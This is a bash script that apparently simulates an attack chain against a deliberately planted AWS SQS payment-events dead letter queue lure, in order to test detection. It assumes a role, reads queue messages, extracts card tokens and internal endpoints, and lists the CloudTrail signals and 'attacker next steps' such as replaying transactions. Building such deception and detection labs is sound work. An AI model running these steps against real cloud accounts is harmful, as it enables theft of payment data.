#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 13 (SQS Payment Events DLQ Lure)
#
# This script walks through the attack chain step by step:
#   Assume role → list queues → get attributes → receive messages from DLQ
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 13 — ABUSE CHAIN"
echo "  SQS Payment Events Dead Letter Queue"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: payment-queue-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/payment-queue-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-payment-queues" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing SQS queues (sqs:ListQueues)"
# ---------------------------------------------------------------
attack "sqs:ListQueues"
aws sqs list-queues --region us-west-2 --output table
info "Target queues identified: prod-payment-events.fifo and DLQ"

# ---------------------------------------------------------------
step "4" "Getting DLQ URL"
# ---------------------------------------------------------------
attack "sqs:GetQueueUrl → prod-payment-events-dlq.fifo"
DLQ_URL=$(aws sqs get-queue-url \
  --queue-name "prod-payment-events-dlq.fifo" \
  --region us-west-2 \
  --query "QueueUrl" \
  --output text)
info "DLQ URL: ${DLQ_URL}"

# ---------------------------------------------------------------
step "5" "Getting DLQ attributes (sqs:GetQueueAttributes)"
# ---------------------------------------------------------------
attack "sqs:GetQueueAttributes → prod-payment-events-dlq.fifo"
aws sqs get-queue-attributes \
  --queue-url "${DLQ_URL}" \
  --attribute-names All \
  --region us-west-2 \
  --output table

# ---------------------------------------------------------------
step "6" "Getting main queue attributes"
# ---------------------------------------------------------------
MAIN_URL=$(aws sqs get-queue-url \
  --queue-name "prod-payment-events.fifo" \
  --region us-west-2 \
  --query "QueueUrl" \
  --output text)
attack "sqs:GetQueueAttributes → prod-payment-events.fifo"
aws sqs get-queue-attributes \
  --queue-url "${MAIN_URL}" \
  --attribute-names ApproximateNumberOfMessages RedrivePolicy \
  --region us-west-2 \
  --output table

# ---------------------------------------------------------------
step "7" "Receiving messages from DLQ (sqs:ReceiveMessage)"
# ---------------------------------------------------------------
attack "sqs:ReceiveMessage → prod-payment-events-dlq.fifo (batch of 10)"
MESSAGES=$(aws sqs receive-message \
  --queue-url "${DLQ_URL}" \
  --max-number-of-messages 10 \
  --visibility-timeout 0 \
  --region us-west-2 \
  --output json)

MSG_COUNT=$(echo "$MESSAGES" | jq '.Messages | length')
info "Received ${MSG_COUNT} messages from DLQ"

# ---------------------------------------------------------------
step "8" "Extracting payment data from DLQ messages"
# ---------------------------------------------------------------
echo ""
echo -e "${YELLOW}--- Failed Payment Events ---${NC}"
echo "$MESSAGES" | jq -r '.Messages[].Body' | jq -r '"  [\(.transaction_id)] \(.customer_id) | \(.merchant_id) | $\(.amount) \(.currency) | card: \(.card_token) | error: \(.error_code)"'

echo ""
echo -e "${YELLOW}--- Internal Endpoints Exposed ---${NC}"
echo "$MESSAGES" | jq -r '.Messages[].Body' | jq -r '"  [\(.error_code)] \(.payment_gateway_response.endpoint)"'

echo ""
warn "Extracted card tokens, transaction details, and internal service endpoints"

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "9" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on payment-queue-readonly-role"
echo "  • CloudTrail: ListQueues"
echo "  • CloudTrail: GetQueueUrl on prod-payment-events-dlq.fifo"
echo "  • CloudTrail: GetQueueAttributes on both queues"
echo "  • CloudTrail: ReceiveMessage on prod-payment-events-dlq.fifo"
echo ""
echo -e "${YELLOW}Attacker next steps (all detectable):${NC}"
echo "  • Attempt to use card tokens against payment endpoints"
echo "  • Probe internal service URLs exposed in error messages"
echo "  • Attempt to replay transactions using idempotency keys"
echo ""
